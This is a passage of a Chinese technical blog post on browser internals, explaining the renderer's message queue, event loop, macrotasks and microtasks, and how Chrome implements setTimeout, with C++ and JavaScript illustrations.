生成字节码，然后通过解释器执行字节码，通过编译器来优化编译字节码。</li><li>基于字节码和编译器，我们又介绍了 JIT 技术。</li><li>最后我们延伸说明了下优化 JavaScript 性能的一些策略。</li></ul><p>之所以在本专栏里讲 V8 的执行流程，是因为我觉得编译器和解释器的相关概念和理论对于程序员来说至关重要，向上能让你充分理解一些前端应用的本质，向下能打开计算机编译原理的大门。通过这些知识的学习能让你将很多模糊的概念关联起来，使其变得更加清楚，从而拓宽视野，上升到更高的层次。</p><h1 id="四、浏览器中的页面循环系统"><a href="#四、浏览器中的页面循环系统" class="headerlink" title="四、浏览器中的页面循环系统"></a>四、浏览器中的页面循环系统</h1><p>前面我们讲到了每个渲染进程都有一个主线程，并且主线程非常繁忙，既要处理 DOM，又要计算样式，还要处理布局，同时还需要处理 JavaScript 任务以及各种输入事件。要让这么多不同类型的任务在主线程中有条不紊地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是我们今天要讲的消息队列和事件循环系统。</p><p>在写这篇文章之前，我翻阅了大量的资料，却发现没有一篇文章能把消息循环系统给讲清楚的，所以我决定用一篇文章来专门介绍页面的事件循环系统。事件循环非常底层且非常重要，学会它能让你理解页面到底是如何运行的， 所以在本篇文章中，我们会将页面的事件循环给梳理清楚、讲透彻。</p><p>为了能让你更加深刻地理解事件循环机制，我们就从最简单的场景来分析，然后带你一步步了解浏览器页面主线程是如何运作的。</p><p>需要说明的是，文章中的代码我会采用 C++ 来示范。如果你不熟悉 C++，也没有关系，这里并没有涉及到任何复杂的知识点，只要你了解 JavaScript 或 Python，你就会看懂。</p><h2 id="1-消息队列和事件循环：页面是怎么“活”起来的？"><a href="#1-消息队列和事件循环：页面是怎么“活”起来的？" class="headerlink" title="1. 消息队列和事件循环：页面是怎么“活”起来的？"></a>1. 消息队列和事件循环：页面是怎么“活”起来的？</h2><h3 id="使用单线程处理安排好的任务"><a href="#使用单线程处理安排好的任务" class="headerlink" title="使用单线程处理安排好的任务"></a>使用单线程处理安排好的任务</h3><p>我们先从最简单的场景讲起，比如有如下一系列的任务：</p><ul><li>任务 1：1+2</li><li>任务 2：20&#x2F;5</li><li>任务 3：7*8</li><li>任务 4：打印出任务 1、任务 2、任务 3 的运算结果</li></ul><p>现在要在一个线程中去执行这些任务，通常我们会这样编写代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void MainThread()&#123;</span><br><span class="line">     int num1 = 1+2; // 任务 1</span><br><span class="line">     int num2 = 20/5; // 任务 2</span><br><span class="line">     int num3 = 7*8; // 任务 3</span><br><span class="line">     print(&quot; 最终计算的值为:%d,%d,%d&quot;,num,num2,num3)； // 任务 4</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在上面的执行代码中，我们把所有任务代码按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，线程会自动退出。可以参考下图来直观地理解下其执行过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205014883.png" alt="image-20221014205014883"></p><h3 id="在线程运行过程中处理新任务"><a href="#在线程运行过程中处理新任务" class="headerlink" title="在线程运行过程中处理新任务"></a>在线程运行过程中处理新任务</h3><p>但并不是所有的任务都是在执行之前统一安排好的，大部分情况下，新的任务是在线程运行过程中产生的。比如在线程执行过程中，又接收到了一个新的任务要求计算“10+2”，那上面那种方式就无法处理这种情况了。</p><p><strong>要想在线程运行过程中，能接收并执行新的任务，就需要采用事件循环机制</strong>。我们可以通过一个 for 循环语句来监听是否有新的任务，如下面的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//GetInput</span><br><span class="line">// 等待用户从键盘输入一个数字，并返回该输入的数字</span><br><span class="line">int GetInput()&#123;</span><br><span class="line">    int input_number = 0;</span><br><span class="line">    cout&lt;&lt;&quot; 请输入一个数:&quot;;</span><br><span class="line">    cin&gt;&gt;input_number;</span><br><span class="line">    return input_number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主线程 (Main Thread)</span><br><span class="line">void MainThread()&#123;</span><br><span class="line">     for(;;)&#123;</span><br><span class="line">          int first_num = GetInput()；</span><br><span class="line">          int second_num = GetInput()；</span><br><span class="line">          result_num = first_num + second_num;</span><br><span class="line">          print(&quot; 最终计算的值为:%d&quot;,result_num)；</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相较于第一版的线程，这一版的线程做了两点改进。</p><ul><li><strong>第一点引入了循环机制</strong>，具体实现方式是在线程语句最后添加了一个<strong>for 循环语句</strong>，线程会一直循环执行。</li><li><strong>第二点是引入了事件</strong>，可以在线程运行过程中，等待用户输入的数字，等待过程中线程处于暂停状态，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。</li></ul><p>通过引入事件循环机制，就可以让该线程“活”起来了，我们每次输入两个数字，都会打印出两数字相加的结果，你可以结合下图来参考下这个改进版的线程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205029205.png" alt="image-20221014205029205"></p><h3 id="处理其他线程发送过来的任务"><a href="#处理其他线程发送过来的任务" class="headerlink" title="处理其他线程发送过来的任务"></a>处理其他线程发送过来的任务</h3><p>上面我们改进了线程的执行方式，引入了事件循环机制，可以让其在执行过程中接受新的任务。不过在第二版的线程模型中，所有的任务都是来自于线程内部的，如果另外一个线程想让主线程执行一个任务，利用第二版的线程模型是无法做到的。</p><p>那下面我们就来看看其他线程是如何发送消息给渲染主线程的，具体形式你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205041570.png" alt="image-20221014205041570"></p><p>从上图可以看出，渲染主线程会频繁接收到来自于 IO 线程的一些任务，接收到这些任务之后，渲染进程就需要着手处理，比如接收到资源加载完成的消息后，渲染进程就要着手进行 DOM 解析了；接收到鼠标点击的消息后，渲染主线程就要开始执行相应的 JavaScript 脚本来处理该点击事件。</p><p>那么如何设计好一个线程模型，能让其能够接收其他线程发送的消息呢？</p><p>一个通用模式是使用<strong>消息队列</strong>。在解释如何实现之前，我们先说说什么是消息队列，可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205052239.png" alt="image-20221014205052239"></p><p>从图中可以看出，<strong>消息队列是一种数据结构，可以存放要执行的任务</strong>。它符合队列“<strong>先进先出</strong>”的特点，也就是说<strong>要添加任务的话，添加到队列的尾部；要取出任务的话，从队列头部去取</strong>。</p><p>有了队列之后，我们就可以继续改造线程模型了，改造方案如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205106732.png" alt="image-20221014205106732"></p><p>从上图可以看出，我们的改造可以分为下面三个步骤：</p><ol><li>添加一个消息队列；</li><li>IO 线程中产生的新任务添加进消息队列尾部；</li><li>渲染主线程会循环地从消息队列头部中读取任务，执行任务。</li></ol><p>有了这些步骤之后，那么接下来我们就可以<strong>按步骤使用代码来实现第三版的线程模型</strong>。</p><p>首先，构造一个队列。当然，在本篇文章中我们不需要考虑队列实现的细节，只是构造队列的接口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class TaskQueue&#123;</span><br><span class="line">  public:</span><br><span class="line">  Task takeTask(); // 取出队列头部的一个任务</span><br><span class="line">  void pushTask(Task task); // 添加一个任务到队列尾部</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来，改造主线程，让主线程从队列中读取任务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TaskQueue task_queue；</span><br><span class="line">void ProcessTask();</span><br><span class="line">void MainThread()&#123;</span><br><span class="line">  for(;;)&#123;</span><br><span class="line">    Task task = task_queue.takeTask();</span><br><span class="line">    ProcessTask(task);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，我们添加了一个消息队列的对象，然后在主线程的 for 循环代码块中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行，因此只要消息队列中有任务，主线程就会去执行。</p><p>主线程的代码就这样改造完成了。这样改造后，主线程执行的任务都全部从消息队列中获取。所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了，添加任务的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Task clickTask;</span><br><span class="line">task_queue.pushTask(clickTask)</span><br></pre></td></tr></table></figure><p>由于是多个线程操作同一个消息队列，所以在添加任务和取出任务时还会加上一个同步锁，这块内容你也要注意下。</p><h3 id="处理其他进程发送过来的任务"><a href="#处理其他进程发送过来的任务" class="headerlink" title="处理其他进程发送过来的任务"></a>处理其他进程发送过来的任务</h3><p>通过使用消息队列，我们实现了线程之间的消息通信。在 Chrome 中，跨进程之间的任务也是频繁发生的，那么如何处理其他进程发送过来的任务？你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205129969.png" alt="image-20221014205129969"></p><p>从图中可以看出，<strong>渲染进程专门有一个 IO 线程用来接收其他进程传进来的消息</strong>，接收到消息之后，会将这些消息组装成任务发送给渲染主线程，后续的步骤就和前面讲解的“处理其他线程发送的任务”一样了，这里就不再重复了。</p><h3 id="消息队列中的任务类型"><a href="#消息队列中的任务类型" class="headerlink" title="消息队列中的任务类型"></a>消息队列中的任务类型</h3><p>现在你知道页面主线程是如何接收外部任务的了，那接下来我们再来看看消息队列中的任务类型有哪些。你可以参考下<a href="https://cs.chromium.org/chromium/src/third_party/blink/public/platform/task_type.h">Chromium 的官方源码</a>，这里面包含了很多内部消息类型，如输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JavaScript 定时器等等。</p><p>除此之外，消息队列中还包含了很多与页面相关的事件，如 JavaScript 执行、解析 DOM、样式计算、布局计算、CSS 动画等。</p><p>以上这些事件都是在主线程中执行的，所以在编写 Web 应用时，你还需要衡量这些事件所占用的时长，并想办法解决单个任务占用主线程过久的问题。</p><h3 id="如何安全退出"><a href="#如何安全退出" class="headerlink" title="如何安全退出"></a>如何安全退出</h3><p>当页面主线程执行完成之后，又该如何保证页面主线程能够安全退出呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个退出标志的变量，在每次执行完一个任务时，判断是否有设置退出标志。</p><p>如果设置了，那么就直接中断当前的所有任务，退出线程，你可以参考下面代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TaskQueue task_queue；</span><br><span class="line">void ProcessTask();</span><br><span class="line">bool keep_running = true;</span><br><span class="line">void MainThread()&#123;</span><br><span class="line">  for(;;)&#123;</span><br><span class="line">    Task task = task_queue.takeTask();</span><br><span class="line">    ProcessTask(task);</span><br><span class="line">    if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环</span><br><span class="line">        break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面使用单线程的缺点"><a href="#页面使用单线程的缺点" class="headerlink" title="页面使用单线程的缺点"></a>页面使用单线程的缺点</h3><p>上面讲述的就是页面线程的循环系统是如何工作的，那接下来，我们继续探讨页面线程的一些特征。</p><p>通过上面的介绍，你应该清楚了，页面线程所有执行的任务都来自于消息队列。消息队列是“先进先出”的属性，也就是说放入队列中的任务，需要等待前面的任务被执行完，才会被执行。鉴于这个属性，就有如下两个问题需要解决。</p><p><strong>第一个问题是如何处理高优先级的任务。</strong></p><p>比如一个典型的场景是监控 DOM 节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计的是，利用 JavaScript 设计一套监听接口，当变化发生时，渲染引擎同步调用这些接口，这是一个典型的观察者模式。</p><p>不过这个模式有个问题，因为 DOM 变化非常频繁，如果每次发生变化的时候，都直接调用相应的 JavaScript 接口，那么这个当前的任务执行时间会被拉长，从而导致<strong>执行效率的下降</strong>。</p><p>如果将这些 DOM 变化做成异步的消息事件，添加到消息队列的尾部，那么又会影响到监控的实时性，因为在添加到消息队列的过程中，可能前面就有很多任务在排队了。</p><p>这也就是说，如果 DOM 发生变化，采用同步通知的方式，会影响当前任务的<strong>执行效率</strong>；如果采用异步方式，又会影响到<strong>监控的实时性</strong>。</p><p>那该如何权衡<strong>效率</strong>和<strong>实时性</strong>呢？</p><p>针对这种情况，微任务就应用而生了，下面我们来看看微任务是如何权衡效率和实时性的。</p><p>通常我们把消息队列中的任务称为<strong>宏任务</strong>，每个宏任务中都包含了一个<strong>微任务队列</strong>，在执行宏任务的过程中，如果 DOM 有变化，那么就会将该变化添加到微任务列表中，这样就不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。</p><p>等宏任务中的主要功能都直接完成之后，这时候，渲染引擎并不着急去执行下一个宏任务，而是执行当前宏任务中的微任务，因为 DOM 变化的事件都保存在这些微任务队列中，这样也就解决了实时性问题。</p><p><strong>第二个是如何解决单个任务执行时长过久的问题。</strong></p><p>因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205145814.png" alt="image-20221014205145814"></p><p>从图中你可以看到，如果在执行动画过程中，其中有个 JavaScript 任务因执行时间过久，占用了动画单帧的时间，这样会给用户制造了卡顿的感觉，这当然是极不好的用户体验。针对这种情况，JavaScript 可以通过回调功能来规避这种问题，也就是让要执行的 JavaScript 任务滞后执行。至于浏览器是如何实现回调功能的，我们在后面的章节中再详细介绍。</p><h3 id="实践：浏览器页面是如何运行的"><a href="#实践：浏览器页面是如何运行的" class="headerlink" title="实践：浏览器页面是如何运行的"></a>实践：浏览器页面是如何运行的</h3><p>有了上面的基础知识之后，我们最后来看看浏览器的页面是如何运行的。</p><p>你可以打开开发者工具，点击“Performance”标签，选择左上角的“start porfiling and load page”来记录整个页面加载过程中的事件执行情况，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014205201226.png" alt="image-20221014205201226"></p><p>从图中可以看出，我们点击展开了 Main 这个项目，其记录了主线程执行过程中的所有任务。图中灰色的就是一个个任务，每个任务下面还有子任务，其中的 Parse HTML 任务，是把 HTML 解析为 DOM 的任务。值得注意的是，在执行 Parse HTML 的时候，如果遇到 JavaScript 脚本，那么会暂停当前的 HTML 解析而去执行 JavaScript 脚本。</p><p>至于 Performance 工具，在后面的章节中我们还会详细介绍，在这里你只需要建立一个直观的印象就可以了。</p><h3 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我来总结下今天所讲的内容。</p><ul><li>如果有一些确定好的任务，可以使用一个单线程来按照顺序处理这些任务，这是第一版线程模型。</li><li>要在线程执行过程中接收并处理新的任务，就需要引入循环语句和事件系统，这是第二版线程模型。</li><li>如果要接收其他线程发送过来的任务，就需要引入消息队列，这是第三版线程模型。</li><li>如果其他进程想要发送任务给页面主线程，那么先通过 IPC 把任务发送给渲染进程的 IO 线程，IO 线程再把任务发送给页面主线程。</li><li>消息队列机制并不是太灵活，为了适应效率和实时性，引入了微任务。</li></ul><p>基于消息队列的设计是目前使用最广的消息架构，无论是安卓还是 Chrome 都采用了类似的任务机制，所以理解了本篇文章的内容后，你再理解其他项目的任务机制也会比较轻松。</p><h2 id="2-WebAPI：setTimeout-是如何实现的？"><a href="#2-WebAPI：setTimeout-是如何实现的？" class="headerlink" title="2. WebAPI：setTimeout 是如何实现的？"></a>2. WebAPI：setTimeout 是如何实现的？</h2><p>在<a href="https://time.geekbang.org/column/article/132931">上一篇文章</a>中我们介绍了页面中的事件和消息队列，知道了<strong>浏览器页面是由消息队列和事件循环系统来驱动的</strong>。</p><p>那在接下来的两篇文章中，我会通过<strong>setTimeout</strong>和<strong>XMLHttpRequest</strong>这两个 WebAPI 来介绍事件循环的应用。这两个 WebAPI 是两种不同类型的应用，比较典型，并且在 JavaScript 中的使用频率非常高。你可能觉得它们太简单、太基础，但有时候恰恰是基础简单的东西才最重要，了解它们是如何工作的会有助于你写出更加高效的前端代码。</p><p>本篇文章主要介绍的是<strong>setTimeout</strong>。其实说起 setTimeout 方法，从事开发的同学想必都不会陌生，它就是一个<strong>定时器，用来指定某个函数在多少毫秒之后执行</strong>。它会返回一个整数，表示定时器的编号，同时你还可以通过该编号来取消这个定时器。下面的示例代码就演示了定时器最基础的使用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function showName()&#123;</span><br><span class="line">  console.log(&quot; 极客时间 &quot;)</span><br><span class="line">&#125;</span><br><span class="line">var timerID = setTimeout(showName,200);</span><br></pre></td></tr></table></figure><p>执行上述代码，输出的结果也很明显，通过 setTimeout 指定在 200 毫秒之后调用 showName 函数，并输出“极客时间”四个字。</p><p>简单了解了 setTimeout 的使用方法后，那接下来我们就来看看浏览器是如何实现定时器的，然后再介绍下定时器在使用过程中的一些注意事项。</p><h3 id="浏览器怎么实现-setTimeout"><a href="#浏览器怎么实现-setTimeout" class="headerlink" title="浏览器怎么实现 setTimeout"></a>浏览器怎么实现 setTimeout</h3><p>要了解定时器的工作原理，就得先来回顾下之前讲的事件循环系统，我们知道渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。下面我们来看看那些典型的事件：</p><ul><li>当接收到 HTML 文档数据，渲染引擎就会将“解析 DOM”事件添加到消息队列中，</li><li>当用户改变了 Web 页面的窗口大小，渲染引擎就会将“重新布局”的事件添加到消息队列中。</li><li>当触发了 JavaScript 引擎垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中。</li><li>同样，如果要执行一段异步 JavaScript 代码，也是需要将执行任务添加到消息队列中。</li></ul><p>以上列举的只是一小部分事件，这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中的顺序来执行事件。</p><p>所以说要执行一段异步任务，需要先将任务添加到消息队列中。不过通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。</p><p>那么该怎么设计才能让定时器设置的回调事件在规定时间内被执行呢？你也可以思考下，如果让你在消息循环系统的基础之上加上定时器的功能，你会如何设计？</p><p>在 Chrome 中除了正常使用的消息队列之外，还有另外一个消息队列，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，渲染进程会将该定时器的回调任务添加到延迟队列中。</p><p>如果感兴趣，你可以参考<a href="https://cs.chromium.org/chromium/src/base/task/sequence_manager/task_queue_impl.h">Chromium 中关于队列部分的源码</a>。</p><p>源码中延迟执行队列的定义如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> DelayedIncomingQueue delayed_incoming_queue;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当通过 JavaScript 调用 setTimeout 设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数 showName、当前发起时间、延迟执行时间，其模拟代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct DelayTask&#123;</span><br><span class="line">  int64 id；</span><br><span class="line">  CallBackFunction cbf;</span><br><span class="line">  int start_time;</span><br><span class="line">  int delay_time;</span><br><span class="line">&#125;;</span><br><span class="line">DelayTask timerTask;</span><br><span class="line">timerTask.cbf = showName;</span><br><span class="line">timerTask.start_time = getCurrentTime(); // 获取当前时间</span><br><span class="line">timerTask.delay_time = 200;// 设置延迟执行时间</span><br></pre></td></tr></table></figure><p>创建好回调任务之后，再将该任务添加到延迟执行队列中，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delayed_incoming_queue.push(timerTask)；</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>现在通过定时器发起的任务就被保存到延迟队列中了，那接下来我们再来看看消息循环系统是怎么触发延迟队列的。</p><p>我们可以来完善<a href="https://time.geekbang.org/column/article/132931">上一篇文章</a>中消息循环的代码，在其中加入执行延迟队列的代码，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ProcessTimerTask()&#123;</span><br><span class="line">  // 从 delayed_incoming_queue 中取出已经到期的定时器任务</span><br><span class="line">  // 依次执行这些任务</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TaskQueue task_queue；</span><br><span class="line">void ProcessTask();</span><br><span class="line">bool keep_running = true;</span><br><span class="line">void MainTherad()&#123;</span><br><span class="line">  for(;;)&#123;</span><br><span class="line">    // 执行消息队列中的任务</span><br><span class="line">    Task task = task_queue.takeTask();</span><br><span class="line">    ProcessTask(task);</span><br><span class="line"></span><br><span class="line">    // 执行延迟队列中的任务</span><br><span class="line">    ProcessDelayTask()</span><br><span class="line"></span><br><span class="line">    if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环</span><br><span class="line">        break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面代码可以看出来，我们添加了一个<strong>ProcessDelayTask 函数</strong>，该函数是专门用来处理延迟执行任务的。这里我们要重点关注它的执行时机，在上段代码中，处理完消息队列中的一个任务之后，就开始执行 ProcessDelayTask 函数。ProcessDelayTask 函数会根据发起时间和延迟时间计算出到期的任务，然后依次执行这些到期的任务。等到期的任务执行完成之后，再继续下一个循环过程。通过这样的方式，一个完整的定时器就实现了。</p><p>设置一个定时器，JavaScript 引擎会返回一个定时器的 ID。那通常情况下，当一个定时器的任务还没有被执行的时候，也是可以取消的，具体方法是调用<strong>clearTimeout 函数</strong>，并传入需要取消的定时器的 ID。如下面代码所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clearTimeout(timer_id)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其实浏览器内部实现取消定时器的操作也是非常简单的，就是直接从 delayed_incoming_queue 延迟队列中，通过 ID 查找到对应的任务，然后再将其从队列中删除掉就可以了。</p><h3 id="使用-setTimeout-的一些注意事项"><a href="#使用-setTimeout-的一些注意事项" class="headerlink" title="使用 setTimeout 的一些注意事项"></a>使用 setTimeout 的一些注意事项</h3><p>现在你应该知道在浏览器内部定时器是如何工作的了。不过在使用定时器的过程中，如果你不了解定时器的一些细节，那么很有可能掉进定时器的一些陷阱里。所以接下来，我们就来讲解一下在使用定时器过程中存在的那些陷阱。</p><h4 id="1-如果当前任务执行时间过久，会影延迟到期定时器任务的执行"><a href="#1-如果当前任务执行时间过久，会影延迟到期定时器任务的执行" class="headerlink" title="1. 如果当前任务执行时间过久，会影延迟到期定时器任务的执行"></a>1. 如果当前任务执行时间过久，会影延迟到期定时器任务的执行</h4><p>在使用 setTimeout 的时候，有很多因素会导致回调函数执行比设定的预期值要久，其中一个就是当前任务执行时间过久从而导致定时器设置的任务被延后执行。我们先看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bar() &#123;</span><br><span class="line">    console.log(&#x27;bar&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">function foo() &#123;</span><br><span class="line">    setTimeout(bar, 0);</span><br><span class="line">    for (let i = 0; i &lt; 5000; i++) &#123;</span><br><span class="line">        let i = 5+8+8+8</span><br><span class="line">        console.log(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>这段代码中，在执行 foo 函数的时候使用 setTimeout 设置了一个 0 延时的回调任务，设置好回调任务后，foo 函数会继续执行 5000 次 for 循环。</p><p>通过 setTimeout 设置的回调任务被放入了消息队列中并且等待下一次执行，这里并不是立即执行的；要执行消息队列中的下个任务，需要等待当前的任务执行完成，由于当前这段代码要执行 5000 次的 for 循环，所以当前这个任务的执行时间会比较久一点。这势必会影响到下个任务的执行时间。</p><p>你也可以打开 Performance 来看看其执行过程，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221110074.png" alt="image-20221014221110074"></p><p>从图中可以看到，执行 foo 函数所消耗的时长是 500 毫秒，这也就意味着通过 setTimeout 设置的任务会被推迟到 500 毫秒以后再去执行，而设置 setTimeout 的回调延迟时间是 0。</p><h4 id="2-如果-setTimeout-存在嵌套调用，那么系统会设置最短时间间隔为-4-毫秒"><a href="#2-如果-setTimeout-存在嵌套调用，那么系统会设置最短时间间隔为-4-毫秒" class="headerlink" title="2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒"></a>2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒</h4><p>也就是说在定时器函数里面嵌套调用定时器，也会延长定时器的执行时间，可以先看下面的这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cb() &#123; setTimeout(cb, 0); &#125;</span><br><span class="line">setTimeout(cb, 0);</span><br></pre></td></tr></table></figure><p>上述这段代码你有没有看出存在什么问题？</p><p>你还是可以通过 Performance 来记录下这段代码的执行过程，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221119215.png" alt="image-20221014221119215"></p><p>上图中的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用超过五次以上，后面每次的调用最小时间间隔是 4 毫秒。之所以出现这样的情况，是因为在 Chrome 中，定时器被嵌套调用 5 次以上，系统会判断该函数方法被阻塞了，如果定时器的调用时间间隔小于 4 毫秒，那么浏览器会将每次调用的时间间隔设置为 4 毫秒。下面是<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/frame/dom_timer.cc">Chromium 实现 4 毫秒延迟的代码</a>，你可以看下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const int kMaxTimerNestingLevel = 5;</span><br><span class="line"></span><br><span class="line">// Chromium uses a minimum timer interval of 4ms. We&#x27;d like to go</span><br><span class="line">// lower; however, there are poorly coded websites out there which do</span><br><span class="line">// create CPU-spinning loops.  Using 4ms prevents the CPU from</span><br><span class="line">// spinning too busily and provides a balance between CPU spinning and</span><br><span class="line">// the smallest possible interval timer.</span><br><span class="line">static constexpr base::TimeDelta kMinimumInterval = base::TimeDelta::FromMilliseconds(4);</span><br><span class="line">base::TimeDelta interval_milliseconds =</span><br><span class="line">      std::max(base::TimeDelta::FromMilliseconds(1), interval);</span><br><span class="line"></span><br><span class="line">  if (interval_milliseconds &lt; kMinimumInterval &amp;&amp;</span><br><span class="line">      nesting_level_ &gt;= kMaxTimerNestingLevel)</span><br><span class="line">    interval_milliseconds = kMinimumInterval;</span><br><span class="line"></span><br><span class="line">  if (single_shot)</span><br><span class="line">    StartOneShot(interval_milliseconds, FROM_HERE);</span><br><span class="line">  else</span><br><span class="line">    StartRepeating(interval_milliseconds, FROM_HERE);</span><br></pre></td></tr></table></figure><p>所以，一些实时性较高的需求就不太适合使用 setTimeout 了，比如你用 setTimeout 来实现 JavaScript 动画就不是一个很好的主意。</p><h4 id="3-未激活的页面，setTimeout-执行最小间隔是-1000-毫秒"><a href="#3-未激活的页面，setTimeout-执行最小间隔是-1000-毫秒" class="headerlink" title="3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒"></a>3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒</h4><p>除了前面的 4 毫秒延迟，还有一个很容易被忽略的地方，那就是未被激活的页面中定时器最小值大于 1000 毫秒，也就是说，如果标签不是当前的激活标签，那么定时器最小的时间间隔是 1000 毫秒，目的是为了优化后台页面的加载损耗以及降低耗电量。这一点你在使用定时器的时候要注意。</p><h4 id="4-延时执行时间有最大值"><a href="#4-延时执行时间有最大值" class="headerlink" title="4. 延时执行时间有最大值"></a>4. 延时执行时间有最大值</h4><p>除了要了解定时器的回调函数时间比实际设定值要延后之外，还有一点需要注意下，那就是 Chrome、Safari、Firefox 都是以 32 个 bit 来存储延时值的，32bit 最大只能存放的数字是 2147483647 毫秒，这就意味着，如果 setTimeout 设置的延迟值大于 2147483647 毫秒（大约 24.8 天）时就会溢出，这导致定时器会被立即执行。你可以运行下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function showName()&#123;</span><br><span class="line">  console.log(&quot; 极客时间 &quot;)</span><br><span class="line">&#125;</span><br><span class="line">var timerID = setTimeout(showName,2147483648);// 会被理解调用执行</span><br></pre></td></tr></table></figure><p>运行后可以看到，这段代码是立即被执行的。但如果将延时值修改为小于 2147483647 毫秒的某个值，那么执行时就没有问题了。</p><h4 id="5-使用-setTimeout-设置的回调函数中的-this-不符合直觉"><a href="#5-使用-setTimeout-设置的回调函数中的-this-不符合直觉" class="headerlink" title="5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉"></a>5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉</h4><p>如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。这点在前面介绍 this 的时候也提过，你可以看下面这段代码的执行结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var name= 1;</span><br><span class="line">var MyObj = &#123;</span><br><span class="line">  name: 2,</span><br><span class="line">  showName: function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(MyObj.showName,1000)</span><br></pre></td></tr></table></figure><p>这里输出的是 1，因为这段代码在编译的时候，执行上下文中的 this 会被设置为全局 window，如果是严格模式，会被设置为 undefined。</p><p>那么该怎么解决这个问题呢？通常可以使用下面这两种方法。</p><p>第一种是将<code>MyObj.showName</code>放在匿名函数中执行，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 箭头函数</span><br><span 